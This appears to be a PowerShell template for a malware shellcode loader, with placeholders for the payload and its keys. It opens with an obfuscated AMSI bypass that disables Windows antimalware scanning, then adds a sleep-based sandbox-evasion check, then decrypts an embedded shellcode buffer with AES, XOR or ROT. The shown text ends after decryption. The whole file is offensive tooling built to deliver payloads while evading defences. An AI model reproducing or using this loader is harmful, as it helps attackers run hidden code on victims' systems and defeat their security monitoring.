Foreach($type in [Ref].Assembly.GetTypes()){if($type.Name -like "*iuti*"){Foreach($field in $type.GetFields('NonPublic,Static')){if($field.Name -like "*iinit*"){$field.SetValue(0,$true)}}}}

if ($DELAY) {
    $now = [DateTime]::Now
    Start-Sleep -Seconds $DELAY
    $deltaT = ([DateTime]::Now).Subtract($now).TotalSeconds

    if ($deltaT -lt ($DELAY - 0.5)) {
        exit
    }
}

$buf  = {{SHELLCODE}}

$ENCRYPT = {{ENCRYPT}}

if ($ENCRYPT -eq 'AES') {
    $key = {{AES_KEY}}
    $iv  = {{AES_IV}}

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV  = $iv

    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $decryptor = $aes.CreateDecryptor()

    $ms = New-Object System.IO.MemoryStream
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

    $cs.Write($buf, 0, $buf.Length)
    $cs.FlushFinalBlock()
    $cs.Close()

    $buf = $ms.ToArray()
    $ms.Close()
    $aes.Dispose()
}
elseif ($ENCRYPT -eq 'XOR') {
    $XOR_KEY = {{XOR_KEY}}
    for ($i = 0; $i -lt $buf.Length; $i++) {
        $buf[$i] = $buf[$i] -bxor $XOR_KEY
    }
}
elseif ($ENCRYPT -eq 'ROT') {
    $ROT_KEY = {{ROT_KEY}}
    for ($i = 0; $i -lt $buf.Length; $i++) {
        $buf[$i] = [byte]( ($buf[$i] - $ROT_KEY) -band 0xFF )
    }
}    